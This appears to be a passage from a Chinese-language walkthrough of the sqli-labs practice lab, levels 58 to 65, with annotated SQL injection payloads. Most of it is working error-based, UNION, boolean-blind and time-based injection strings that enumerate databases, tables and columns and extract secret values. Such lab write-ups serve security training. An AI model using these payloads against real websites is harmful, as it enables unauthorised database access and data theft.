+   - MySQL 的 `EXTRACTVALUE()` 函数，本用于从 XML 字符串中提取值。这里利用其第二个参数（XPath 表达式）非法时报错并显示表达式内容的特性。  
+   - 参数1（`1`）：无实际意义的 XML 片段占位。  
+   - 参数2：由 `CONCAT` 构造的非法 XPath 表达式，导致函数报错，输出表达式本身，从而泄露内部拼接的数据。
+
+4. **`CONCAT(0x7e, (SELECT ...), 0x7e)`**  
+   - 将波浪号 `~`（ASCII 0x7e）与子查询结果及另一个波浪号拼接。  
+   - 波浪号不是合法的 XPath 语法，因此会触发报错，并在错误信息中显示完整的拼接字符串，便于区分数据边界。
+
+5. **`(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())`**  
+   - 子查询：从 MySQL 系统表 `information_schema.tables` 中查询当前数据库（`DATABASE()` 返回当前库名）的所有表名。  
+   - `GROUP_CONCAT(table_name)` 将所有表名合并为一个逗号分隔的字符串（例如 `users,products,orders`）。  
+   - 该结果会被拼接进 XPath 表达式，最终通过报错信息输出。
+
+6. **`--%20--+`**  
+   - `--` 是 SQL 的单行注释标记，用于注释掉原始 SQL 语句中 `?id=-1'` 之后剩余的部分（如原本的结尾引号或其他条件）。  
+   - `%20` 是 URL 编码的空格，确保注释符 `--` 后面紧跟一个空格（SQL 语法要求）。  
+   - 第二个 `--+` 可能是多余的注释写法，其中 `+` 在 URL 中被解码为空格，因此整体等价于 `--  -- `，进一步确保注释生效。实际上只需一个 `--` 加空格即可，此处为攻击者的冗余习惯。
+
+
+
+或者
+
+```sql
+?id=-1' union select 1,2,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
+```
+
+1. **`?id=-1'`**  
+   - URL 查询参数，将 `id` 赋值为 `-1'`。  
+   - `-1` 使得原查询（假设 `id` 为正数）返回空结果，避免干扰联合查询的输出。  
+   - 结尾的单引号 `'` 用于闭合后端 SQL 语句中原本的字符串定界符（例如 `WHERE id='$id'` 中的第一个单引号），使后续注入的 `union` 成为有效 SQL 语法。
+
+2. **`union select 1,2,( ... )`**  
+   - SQL 的 `UNION` 操作符，用于合并两个查询的结果集。这里利用其将攻击者构造的查询结果附加到原始查询之后。  
+   - 需要与原始查询的列数匹配，`1,2` 是占位符（假设原始查询有 3 列，这里第 3 列使用报错注入函数）。  
+   - 由于原始查询因 `id=-1` 无返回，最终页面显示的内容将来自 `UNION` 后面的查询（如果未报错），但这里实际利用的是 `extractvalue` 的报错机制。
+
+3. **`extractvalue(1, concat(0x7e, (子查询), 0x7e))`**  
+   - MySQL 的 `EXTRACTVALUE()` 函数，本用于从 XML 字符串中提取值。此处利用其第二个参数（XPath 表达式）非法时返回错误信息并显示表达式内容的特性。  
+   - 参数1（`1`）：无实际意义的 XML 片段占位。  
+   - 参数2：通过 `CONCAT` 构造的非法 XPath 表达式，导致函数报错，从而在错误信息中泄露拼接的字符串。
+
+4. **`concat(0x7e, (select group_concat(schema_name) from information_schema.schemata), 0x7e)`**  
+   - `0x7e` 是波浪号 `~` 的十六进制表示，用作报错信息中的分隔符，便于观察提取的数据。  
+   - 中间的子查询从 `information_schema.schemata`（MySQL 系统表，存储所有数据库名）中查询所有 `schema_name`（数据库名）。  
+   - `group_concat(schema_name)` 将所有数据库名合并为一个逗号分隔的字符串（例如 `mysql,challenges,test,...`）。  
+   - 整体拼接成 `~db1,db2,db3~` 的形式，作为 XPath 表达式，因包含 `~` 非法，触发报错。
+
+5. **`--+`**  
+   - `--` 是 SQL 的单行注释标记，用于注释掉原始 SQL 语句中 `id=-1'` 之后剩余的部分（如原本结尾的另一个单引号或其他查询条件）。  
+   - `+` 在 URL 中被解码为空格，确保注释符 `--` 后面紧跟一个空格（SQL 语法要求注释符后必须有空格或控制字符）。  
+   - 整个 `--+` 使注入语句后的原始 SQL 代码被忽略，避免语法错误。
+
+
+
+
+
+![Less-58-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-01.PNG)
+
+
+
+~~~ cmd
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='P0OG7GKLDD'),0x7e),1)--+
+~~~
+
+![Less-58-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-02.PNG)
+
+
+
+~~~ cmd
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_EL3Q) from P0OG7GKLDD),0x7e),1)--+
+~~~
+
+![Less-58-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-58-03.PNG)
+
+
+
+至此成功
+
+
+
+### Less-59
+
+五十九关和五十八关一样使用报错注入，id是整数型。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/5d478ac77a2c78dfc2aaba7c3bc85e5d.png)
+
+
+
+#### 爆库
+
+~~~ cmd
+?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-01.PNG)
+
+
+
+#### 爆列
+
+~~~ cmd
+?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='V9J0SQ759Q'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-02.PNG)
+
+
+
+#### 爆数据
+
+~~~ cmd
+?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_FKSV) from V9J0SQ759Q),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-59-03.PNG)
+
+至此成功
+
+
+
+### Less-60
+
+六十关根据报错信息可知id参数是双引号加括号
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/f68708a1b6e7fa283b7521dd98dd5e00.png)
+
+
+
+#### 爆表
+
+~~~ cmd
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-01.PNG)
+
+
+
+#### 爆列
+
+~~~ cmd
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='NTXT24T09Q'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-02.PNG)
+
+
+
+#### 爆数据
+
+~~~ cmd
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_68FZ) from NTXT24T09Q),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-60-03.PNG)
+
+至此成功
+
+
+
+### Less-61
+
+六十一关根据报错信息可知id参数是单引号加两个括号
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/f197b6d2d20591434ea4dd23250a666f.png)
+
+
+
+#### 爆表
+
+~~~ cmd
+?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-01.PNG)
+
+
+
+#### 爆列
+
+~~~ cmd
+?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='1MPGCD92XR'),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-02.PNG)
+
+
+
+#### 爆数据
+
+~~~ cmd
+?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_JS1S) from 1MPGCD92XR),0x7e),1)--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-61-03.PNG)
+
+至此成功
+
+
+
+### Less-62
+
+六十二关没有报错显示，可以使用布尔盲注和时间注入。id参数是单引号加括号
+
+~~~ cmd
+?id=1') and if(length((select database()))=10,sleep(5),1)--+  时间注入，如果出现延迟表示该数据库名长度是10 
+ 
+ 
+?id=1')and length((select database()))=10--+  布尔盲注,正确的话返回正常页面否则不会返回正常页面
+~~~
+
+![](./img/3df93d35acc1a1453696f45fa7e8691f.png)
+
+
+
+### Less-63
+
+六十三关没有报错显示，可以使用布尔盲注和时间注入。id参数是单引号。
+
+![](./img/3f63158d6ada119aa2ddcb50db6e58a9.png)
+
+
+
+### Less-64
+
+id参数是两个括号的整数型
+
+![](./img/d1ca3ec6388bf5c364e8664900f1b209.png)
+
+
+
+### Less-65
+
+id参数是一个括号的整数型
+
+![](./img/5c50bea2ba523fe1b9db9a720ed9ea9a.png)
